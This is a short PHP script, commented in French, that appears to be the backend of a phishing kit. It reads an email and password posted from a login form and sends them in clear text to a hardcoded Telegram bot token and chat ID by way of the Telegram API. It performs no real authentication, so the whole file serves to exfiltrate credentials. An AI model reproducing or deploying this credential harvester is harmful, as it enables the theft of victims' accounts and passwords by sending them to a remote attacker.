<?php
// Vérifiez si l'email et le mot de passe sont envoyés via POST
if (isset($_POST['email']) && isset($_POST['password'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Remplacez par votre Token de Bot Telegram et Chat ID
    $botToken = "8054681380:AAGq5oUs8XRxM6NhZA-N9F0D9hjwbfqECLU"; // Remplacez par votre token de bot Telegram
    $chatId = "8179736651"; // Remplacez par votre ID de chat Telegram (par exemple, un ID de groupe ou un ID de votre chat privé)

    // Créer un message à envoyer
    $message = "Nouveau login sur le site\n\n";
    $message .= "Email: $email\n";
    $message .= "Mot de passe: $password\n"; // Bien que ce ne soit pas recommandé d'envoyer des mots de passe en clair, c'est pour cet exemple.

    // URL de l'API Telegram pour envoyer le message
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    // Paramètres pour envoyer les données via une requête GET
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    // Créer une URL avec les paramètres
    $queryData = http_build_query($data);
    $finalUrl = $url . '?' . $queryData;

    // Exécuter la requête cURL pour envoyer le message
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $finalUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($ch);
    curl_close($ch);

    // Vérifier la réponse de l'API
    if ($result) {
        $response = json_decode($result, true);
        if ($response['ok']) {
            // Réponse positive, message envoyé
            echo json_encode(['signal' => 'ok', 'msg' => 'Message envoyé à Telegram']);
        } else {
            // Erreur lors de l'envoi du message
            echo json_encode(['signal' => 'error', 'msg' => 'Erreur lors de l\'envoi du message']);
        }
    } else {
        // Si la requête cURL échoue
        echo json_encode(['signal' => 'error', 'msg' => 'Impossible de se connecter à l\'API Telegram']);
    }
} else {
    // Si les données ne sont pas envoyées via POST
    echo json_encode(['signal' => 'error', 'msg' => 'Données manquantes']);
}
?>
